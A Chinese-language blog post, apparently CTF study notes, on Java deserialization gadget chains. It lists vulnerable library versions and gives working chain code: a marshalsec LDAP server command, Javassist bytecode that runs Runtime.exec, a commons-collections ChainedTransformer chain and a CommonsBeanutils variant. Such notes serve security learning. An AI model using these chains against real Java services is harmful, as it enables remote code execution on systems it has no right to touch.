<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="我的链子  ctf版半年前总结的不知道弄哪里去了，粗心关了感觉自己一事无成。 做笔记就得照着自己完全不会的程度做。太傻逼了。 各种依赖Hessian     com.caucho     hessian     4.0.38  ### ROME 12345&lt;dependency&gt;    &lt;groupId&gt;rome&lt;&#x2F;groupId&gt;    &lt;artifac">
<meta property="og:type" content="article">
<meta property="og:title" content="链子">
<meta property="og:url" content="http://example.com/2024/07/19/%E9%93%BE%E5%AD%90/index.html">
<meta property="og:site_name" content="Charger0">
<meta property="og:description" content="我的链子  ctf版半年前总结的不知道弄哪里去了，粗心关了感觉自己一事无成。 做笔记就得照着自己完全不会的程度做。太傻逼了。 各种依赖Hessian     com.caucho     hessian     4.0.38  ### ROME 12345&lt;dependency&gt;    &lt;groupId&gt;rome&lt;&#x2F;groupId&gt;    &lt;artifac">
<meta property="og:locale">
<meta property="article:published_time" content="2024-07-19T19:38:24.000Z">
<meta property="article:modified_time" content="2024-11-13T10:35:55.859Z">
<meta property="article:author" content="Charger0">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2024/07/19/%E9%93%BE%E5%AD%90/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh'
  };
</script>

  <title>链子 | Charger0</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Charger0</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">技术记录</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/19/%E9%93%BE%E5%AD%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          链子
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-07-20 03:38:24" itemprop="dateCreated datePublished" datetime="2024-07-20T03:38:24+08:00">2024-07-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-13 18:35:55" itemprop="dateModified" datetime="2024-11-13T18:35:55+08:00">2024-11-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="我的链子-ctf版"><a href="#我的链子-ctf版" class="headerlink" title="我的链子  ctf版"></a>我的链子  ctf版</h1><p>半年前总结的不知道弄哪里去了，粗心关了感觉自己一事无成。</p>
<p>做笔记就得照着自己完全不会的程度做。太傻逼了。</p>
<h2 id="各种依赖"><a href="#各种依赖" class="headerlink" title="各种依赖"></a>各种依赖</h2><h3 id="Hessian"><a href="#Hessian" class="headerlink" title="Hessian"></a>Hessian</h3><dependency>
    <groupId>com.caucho</groupId>
    <artifactId>hessian</artifactId>
    <version>4.0.38</version>
</dependency>
### ROME
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;rome&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
### 
<dependency>
    <groupId>com.caucho</groupId>
    <artifactId>resin</artifactId>
    <version>4.0.63</version>
</dependency>

<h3 id="cc3-2-1"><a href="#cc3-2-1" class="headerlink" title="cc3.2.1"></a>cc3.2.1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h3 id="JAVASSIT"><a href="#JAVASSIT" class="headerlink" title="JAVASSIT"></a>JAVASSIT</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.20.0-GA&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
<h3 id="jackson"><a href="#jackson" class="headerlink" title="jackson"></a>jackson</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.7.9&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.7.9&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.7.9&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h3 id="spring-aop"><a href="#spring-aop" class="headerlink" title="spring-aop"></a>spring-aop</h3><dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-aop</artifactId>
    <version>5.2.7.RELEASE</version>
</dependency>

<p>提供了HotSwappableTargetSource.equals()</p>
<h3 id="spring-context"><a href="#spring-context" class="headerlink" title="spring-context"></a>spring-context</h3><dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-context</artifactId>
    <version>4.1.3.RELEASE</version>
</dependency>

<h3 id="aspectjweaver"><a href="#aspectjweaver" class="headerlink" title="aspectjweaver"></a>aspectjweaver</h3><dependency>
    <groupId>org.aspectj</groupId>
    <artifactId>aspectjweaver</artifactId>
    <version>1.6.10</version>
</dependency>

<h3 id="xbean"><a href="#xbean" class="headerlink" title="xbean"></a>xbean</h3><dependency> 
    <groupId>org.apache.xbean</groupId>
    <artifactId>xbean-naming</artifactId>
    <version>4.24</version>
</dependency>

<h2 id="复用方法"><a href="#复用方法" class="headerlink" title="复用方法"></a>复用方法</h2><h3 id="起开ldap"><a href="#起开ldap" class="headerlink" title="起开ldap"></a>起开ldap</h3><p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServe<br>r <a target="_blank" rel="noopener" href="http://127.0.0.1:9998/#Exp">http://127.0.0.1:9998/#Exp</a> 1388</p>
<h3 id="序列化成文件"><a href="#序列化成文件" class="headerlink" title="序列化成文件"></a>序列化成文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public static Object unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    serialize(o);</span><br><span class="line">    unserialize(&quot;ser.bin&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="什么形式都不变序列化"><a href="#什么形式都不变序列化" class="headerlink" title="什么形式都不变序列化"></a>什么形式都不变序列化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//序列化</span><br><span class="line">ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">oos.writeObject(handler1);</span><br><span class="line">oos.flush();</span><br><span class="line">oos.close();</span><br><span class="line"></span><br><span class="line">//测试反序列化</span><br><span class="line">ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">ois.readObject();</span><br><span class="line">ois.close();</span><br></pre></td></tr></table></figure>

<h3 id="序列化成base64"><a href="#序列化成base64" class="headerlink" title="序列化成base64"></a>序列化成base64</h3><h3 id="evil-bytecode-1"><a href="#evil-bytecode-1" class="headerlink" title="evil bytecode    1"></a>evil bytecode    1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line"></span><br><span class="line">ClassPool classPool=ClassPool.getDefault();//返回默认的类池</span><br><span class="line">classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径</span><br><span class="line">CtClass payload=classPool.makeClass(&quot;</span><br><span class="line">&quot;);//创建一个新的public类</span><br><span class="line">payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet</span><br><span class="line">payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); //创建一个空的类初始化，设置构造函数主体为runtime</span><br><span class="line"></span><br><span class="line">byte[] bytes=payload.toBytecode();//转换为byte数组</span><br></pre></td></tr></table></figure>
<h3 id="反射设置-Field"><a href="#反射设置-Field" class="headerlink" title="反射设置 Field"></a>反射设置 Field</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public static void setFieldValue(Object object, String fieldName, Object value) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="链传递方法"><a href="#链传递方法" class="headerlink" title="链传递方法"></a>链传递方法</h2><h3 id="CC-依赖-后-rce-instance-前Transformer类的-transform-方法。"><a href="#CC-依赖-后-rce-instance-前Transformer类的-transform-方法。" class="headerlink" title="CC 依赖   后 rce&#x2F;instance   前Transformer类的 transform()方法。"></a>CC 依赖   后 rce&#x2F;instance   前Transformer类的 transform()方法。</h3><p>后链可以实现RCE , 后链的source点是 调用了transform()方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">        new ConstantTransformer(Runtime.class),</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//ChainedTransformer实例</span><br><span class="line">Transformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">chainedTransformer.transform(&quot;test&quot;);</span><br></pre></td></tr></table></figure>

<h4 id="1-InstantiateTransformer"><a href="#1-InstantiateTransformer" class="headerlink" title="1   InstantiateTransformer"></a>1   InstantiateTransformer</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public class InstantiateTransformer implements Transformer, Serializable &#123;</span><br><span class="line">    static final long serialVersionUID = 3786388740793356347L;</span><br><span class="line">    public static final Transformer NO_ARG_INSTANCE = new InstantiateTransformer();</span><br><span class="line">    private final Class[] iParamTypes;</span><br><span class="line">    private final Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    //构造函数</span><br><span class="line">    public InstantiateTransformer(Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        this.iParamTypes = paramTypes;</span><br><span class="line">        this.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //重写的 transform 方法，反射调用构造函数将类实例化。</span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        Constructor con = ((Class)input).getConstructor(this.iParamTypes);</span><br><span class="line">        return con.newInstance(this.iArgs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-InvokerTransformer"><a href="#2-InvokerTransformer" class="headerlink" title="2    InvokerTransformer"></a>2    InvokerTransformer</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class InvokerTransformer implements Transformer, Serializable &#123;</span><br><span class="line">    static final long serialVersionUID = -8653385846894047688L;</span><br><span class="line">    private final String iMethodName;</span><br><span class="line">    private final Class[] iParamTypes;</span><br><span class="line">    private final Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    //构造函数</span><br><span class="line">    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        this.iMethodName = methodName;</span><br><span class="line">        this.iParamTypes = paramTypes;</span><br><span class="line">        this.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //重写的 transform 方法，反射调用指定的方法并返回方法调用结果</span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        if (input == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">                return method.invoke(input, this.iArgs);</span><br><span class="line">            &#125; catch …………</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-ConstantTransformer"><a href="#3-ConstantTransformer" class="headerlink" title="3   ConstantTransformer"></a>3   ConstantTransformer</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class ConstantTransformer implements Transformer, Serializable &#123;</span><br><span class="line">    static final long serialVersionUID = 6374440726369055124L;</span><br><span class="line">    public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);</span><br><span class="line">    private final Object iConstant;</span><br><span class="line"></span><br><span class="line">    //构造函数</span><br><span class="line">    public ConstantTransformer(Object constantToReturn) &#123;</span><br><span class="line">        this.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //重写的 transform 方法，获取一个对象类型</span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        return this.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="4-ChainedTransformer"><a href="#4-ChainedTransformer" class="headerlink" title="4    ChainedTransformer"></a>4    ChainedTransformer</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public class ChainedTransformer implements Transformer, Serializable &#123;</span><br><span class="line">    static final long serialVersionUID = 3514945074733160196L;</span><br><span class="line">    private final Transformer[] iTransformers;</span><br><span class="line"></span><br><span class="line">    //构造函数</span><br><span class="line">    public ChainedTransformer(Transformer[] transformers) &#123;</span><br><span class="line">        this.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //重写的 transform 方法，链式调用  Transformer[] 中每个 Transformer 的 transform 方法</span><br><span class="line">    public Object transform(Object object) &#123;</span><br><span class="line">        for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = this.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="javassit"><a href="#javassit" class="headerlink" title="javassit"></a>javassit</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/13811335.html">https://www.cnblogs.com/nice0e3/p/13811335.html</a></p>
<h3 id="原生类-UnixPrintService-前get"><a href="#原生类-UnixPrintService-前get" class="headerlink" title="原生类 UnixPrintService  前get()"></a>原生类 UnixPrintService  前get()</h3><p>在unix下有用，rce  。这个类有诸多 get 方法，通过拼接字符串的方式执行系统命令。可惜这个类在高版本被移除</p>
<h3 id="原生类-SignedObject"><a href="#原生类-SignedObject" class="headerlink" title="原生类 SignedObject"></a>原生类 SignedObject</h3><p>java.security.SignedObject有个 getObject 方法会从流里使用原生反序列化读取数据，就造成了二次反序列化。</p>
<h3 id="原生类BeanContextSupport-readObject流程里有try-catch且不影响反序列化流程的类。-用动态代理封装后，"><a href="#原生类BeanContextSupport-readObject流程里有try-catch且不影响反序列化流程的类。-用动态代理封装后，" class="headerlink" title="原生类BeanContextSupport  readObject流程里有try catch且不影响反序列化流程的类。 用动态代理封装后，"></a>原生类BeanContextSupport  readObject流程里有try catch且不影响反序列化流程的类。 用动态代理封装后，</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">private synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    synchronized(BeanContext.globalHierarchyLock) &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        initialize();</span><br><span class="line"></span><br><span class="line">        bcsPreDeserializationHook(ois);</span><br><span class="line"></span><br><span class="line">        if (serializable &gt; 0 &amp;&amp; this.equals(getBeanContextPeer()))</span><br><span class="line">            readChildren(ois);</span><br><span class="line"></span><br><span class="line">        deserialize(ois, bcmListeners = new ArrayList(1));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public final void readChildren(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    int count = serializable;</span><br><span class="line"></span><br><span class="line">    while (count-- &gt; 0) &#123;</span><br><span class="line">        Object                      child = null;</span><br><span class="line">        BeanContextSupport.BCSChild bscc  = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            child = ois.readObject();</span><br><span class="line">            bscc  = (BeanContextSupport.BCSChild)ois.readObject();</span><br><span class="line">        &#125; catch (IOException ioe) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125; catch (ClassNotFoundException cnfe) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">// ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="原生类-java-util-Collections-ReverseComparator-有CB依赖时常用-用于生成BeanComparator"><a href="#原生类-java-util-Collections-ReverseComparator-有CB依赖时常用-用于生成BeanComparator" class="headerlink" title="原生类 java.util.Collections$ReverseComparator  有CB依赖时常用  用于生成BeanComparator"></a>原生类 java.util.Collections$ReverseComparator  有CB依赖时常用  用于生成BeanComparator</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package java.util;</span><br><span class="line">public class Collections&#123;</span><br><span class="line">    public static &lt;T&gt; Comparator&lt;T&gt; reverseOrder() &#123;  // 直接调用这里</span><br><span class="line">        return (Comparator&lt;T&gt;) ReverseComparator.REVERSE_ORDER;  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private static class ReverseComparator implements Comparator&lt;Comparable&lt;Object&gt;&gt;, Serializable &#123;</span><br><span class="line">        static final ReverseComparator REVERSE_ORDER = new ReverseComparator();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用代码 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//修改CommonsBeanutilsShiro类代码</span><br><span class="line"></span><br><span class="line">BeanComparator beanComparator = new BeanComparator(null, Collections.reverseOrder());  // 修改一下这里就可以</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, beanComparator);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
